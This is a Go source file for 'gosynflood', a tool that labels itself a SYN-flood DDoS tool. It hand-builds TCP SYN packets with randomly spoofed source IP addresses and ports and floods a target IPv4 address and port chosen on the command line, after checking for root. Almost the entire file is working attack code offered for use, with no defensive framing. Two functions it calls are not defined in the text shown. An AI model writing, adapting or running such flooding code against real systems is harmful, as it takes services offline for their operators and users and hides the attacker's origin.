package main

/*
	rootVIII gosynflood - synflood DDOS tool
*/

import (
	"crypto/rand"
	"flag"
	"fmt"
	"net"
	"os"
	"os/user"
	"reflect"
	"strconv"
	"strings"
)

// SYNPacket represents a TCP packet.
type SYNPacket struct {
	Payload   []byte
	TCPLength uint16
	SendMax   uint
	Adapter   string
}

func (s SYNPacket) randByte() byte {
	randomUINT8 := make([]byte, 1)
	rand.Read(randomUINT8)
	return randomUINT8[0]
}

func (s SYNPacket) invalidFirstOctet(val byte) bool {
	return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s SYNPacket) leftshiftor(lval uint8, rval uint8) uint32 {
	return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

// TCPIP represents the IP header and TCP segment in a TCP packet.
type TCPIP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	SYNPacket     `key:"SYNPacket"`
}

func (tcp *TCPIP) calcTCPChecksum() {
	var checksum uint32 = 0
	checksum = tcp.leftshiftor(tcp.SRC[0], tcp.SRC[1]) +
		tcp.leftshiftor(tcp.SRC[2], tcp.SRC[3])
	checksum += tcp.leftshiftor(tcp.DST[0], tcp.DST[1]) +
		tcp.leftshiftor(tcp.DST[2], tcp.DST[3])
	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPLength)
	checksum += uint32(tcp.Offset)
	checksum += uint32(tcp.Window)

	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func (tcp *TCPIP) setPacket() {
	tcp.TCPLength = 0x0028
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	tcp.TotalLen = 0x003C
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40
	tcp.Protocol = 0x06
	tcp.IPChecksum = 0x0000
	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = tcp.Sequence
	tcp.Offset = 0xA002
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
	tcp.Options = make([]byte, 20)
	tcp.calcTCPChecksum()
}

func (tcp *TCPIP) setTarget(ipAddr string, port uint16, npackets uint) {
	tcp.SendMax = npackets
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.DST = append(tcp.DST, (uint8)(val))
	}
	tcp.DstPort = port
}

func (tcp *TCPIP) genIP() {
	firstOct := tcp.randByte()
	for tcp.invalidFirstOctet(firstOct) {
		firstOct = tcp.randByte()
	}

	tcp.SRC = []byte{firstOct, tcp.randByte(), tcp.randByte(), tcp.randByte()}
	tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	for tcp.SrcPort <= 0x03FF {
		tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	}
}

func exitErr(msg string, reason error) {
	fmt.Println(msg)
	if reason != nil {
		fmt.Printf("%v\n", reason)
	}
	os.Exit(1)
}

func main() {
	user, err := user.Current()
	if err != nil || user.Name != "root" {
		exitErr("Root privileges required for execution", err)
	}

	target := flag.String("t", "", "Target IPV4 address")
	tport := flag.Uint("p", 0x0050, "Target Port")
	ifaceName := flag.String("i", "", "Network Interface")
	nPackets := flag.Uint("n", 0x03EB, "Number of packets")
	flag.Parse()
	if len(*target) < 1 || net.ParseIP(*target) == nil {
		exitErr("required argument: -t <Target IP addr>", nil)
	}
	if strings.Count(*target, ".") != 3 || strings.Contains(*target, ":") {
		exitErr(fmt.Sprintf("Invalid IPV4 Address: %s\n", *target), nil)
	}
	if *tport > 0xFFFF {
		exitErr(fmt.Sprintf("Invalid Port: %d\n", *tport), nil)
	}

	var packet = &TCPIP{}
	var foundIface bool = false
	foundIfaces := packet.getInterfaces()
	for _, name := range foundIfaces {
		if name != *ifaceName {
			continue
		}
		foundIface = true
	}

	if !foundIface {
		errmsg := "Invalid argument for -i <interface>\n"
		errmsg += fmt.Sprintf("Found interfaces:\n%s\n", strings.Join(foundIfaces, ", "))
		exitErr(errmsg, nil)
	}

	// T O D O: possibly make goroutines but receive them upon ctrl-c/sigint

	packet.setTarget(*target, uint16(*tport), *nPackets)
	packet.genIP()
	packet.setPacket()

	packet.floodTarget(
		reflect.TypeOf(packet).Elem(),
		reflect.ValueOf(packet).Elem(),
	)
}
